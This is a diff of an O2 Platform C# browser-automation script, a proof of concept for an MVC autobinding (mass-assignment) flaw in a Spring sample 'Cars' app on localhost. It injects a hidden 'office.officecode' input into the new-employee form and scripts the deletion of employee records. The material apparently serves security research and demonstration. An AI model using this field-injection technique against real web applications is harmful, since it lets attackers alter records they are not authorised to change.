@@ -1,6 +1,4 @@
-<?xml version="1.0"?>
-<H2>
-  <SourceCode>//var topPanel = panel.clear().add_Panel();;
+//var topPanel = panel.clear().add_Panel();;
 var topPanel = "PoC - MyEclipse for Spring - Cars app - MVC Autobinding - Add Employee to Office vulnerability".popupWindow(1000,500);
 var actionsPanel = topPanel.insert_Above(40,"payload");
 var controls = topPanel.add_1x1("add employee view","employee and office view");
@@ -19,9 +17,9 @@ bool runExploit = false;
 ///				ie.link("New Employee").click(); 
 //ie.inject_jQuery();
 //ie.inject_FirebugLite();
-Action&lt;string,string,string,string&gt; createEmployeeExploit = 
+Action<string,string,string,string> createEmployeeExploit = 
 	(employeeNumber, firstName, lastName, officeCode)
-		=&gt; {
+		=> {
 				ie.open("http://localhost.:8080/cars/newEmployee");
 				ie.field("employeenumber").value(employeeNumber);
 				ie.field("employeenumber_displayed_").value(employeeNumber);
@@ -29,26 +27,26 @@ Action&lt;string,string,string,string&gt; createEmployeeExploit =
 				ie.field("lastname").value(lastName); 
 				//ie.field("jobtitle").value(jobTitle); 				 
 				if (runExploit)
-					ie.button("Save").injectHtml_beforeBegin("office code:&lt;input type='text' name='office.officecode' value='{0}'/&gt;".format(officeCode));
+					ie.button("Save").injectHtml_beforeBegin("office code:<input type='text' name='office.officecode' value='{0}'/>".format(officeCode));
 				ie.button("Save").click();
 		   };
 
 
 
 Action showEmployeeAndOffice = 
-	()=&gt;{
+	()=>{
 			ie2.open("http://localhost:8080/cars/selectEmployee?employeenumberKey=" + employee_Number);
 			ie3.open("http://localhost.:8080/cars/selectOffice?officecodeKey=" + office_Code);
 		};
 		
 Action deleteEmployee = 
-	()=&gt;{
+	()=>{
 						ie.open("http://localhost.:8080/cars/confirmDeleteEmployee?employeenumberKey={0}".format(employee_Number));
 						ie.link("Delete").click();	
 					};
 					
 Action createEmployee =   
-	()=&gt;{
+	()=>{
 			if (runExploit)
 				deleteEmployee();
 			createEmployeeExploit(employee_Number, "firstN","lastN",office_Code); 
@@ -58,12 +56,12 @@ Action createEmployee =
 
 		
 Action deleteTempUsers = 
-	()=&gt;{
+	()=>{
 			ie.open("http://localhost:8080/cars/indexEmployee");			
-			var accountsToDelete =  ie.links().where((link)=&gt; link.Title == "Delete")
-								  .where((link)=&gt;{ 
+			var accountsToDelete =  ie.links().where((link)=> link.Title == "Delete")
+								  .where((link)=>{ 
 								 					var id = link.url().split("=")[1].removeLastChar().toInt();
-								 					return (id &lt; 1000 || id &gt; 2000);
+								 					return (id < 1000 || id > 2000);
 								 				 }).urls();
 			foreach(var accountToDelete	in accountsToDelete)
 			{
@@ -73,13 +71,13 @@ Action deleteTempUsers =
 		};
 		
 actionsPanel.add_Label("employee number:").top(3) 
-			.append_TextBox(employee_Number).onTextChange((text)=&gt; employee_Number = text) 
+			.append_TextBox(employee_Number).onTextChange((text)=> employee_Number = text) 
 			.append_Label("office code:").top(3).autoSize()
-			.append_TextBox(office_Code).onTextChange((text)=&gt; office_Code = text)
-			.append_CheckBox("Run Exploit", (value)=&gt; runExploit = value)
-			.append_Link("create employee",()=&gt; createEmployee())
-			.append_Link("delete employee",()=&gt; deleteEmployee())
-			.append_Link("delete temp employee", ()=&gt; deleteTempUsers()).leftAdd(200);
+			.append_TextBox(office_Code).onTextChange((text)=> office_Code = text)
+			.append_CheckBox("Run Exploit", (value)=> runExploit = value)
+			.append_Link("create employee",()=> createEmployee())
+			.append_Link("delete employee",()=> deleteEmployee())
+			.append_Link("delete temp employee", ()=> deleteTempUsers()).leftAdd(200);
 			
 ie.open("http://localhost:8080/cars/indexEmployee"); 
 showEmployeeAndOffice(); 
@@ -89,7 +87,7 @@ return "done";
 //ie.field("firstname").value("FFFFF");
 
 
-//O2File:WatiN_IE_ExtensionMethods.cs
-//O2Ref:WatiN.Core.1x.dll</SourceCode>
-  <ReferencedAssemblies />
-</H2>
+//using FluentSharp.Watin
+//O2Ref:FluentSharp.Watin.dll
+//O2Ref:Watin.Core.dll
+
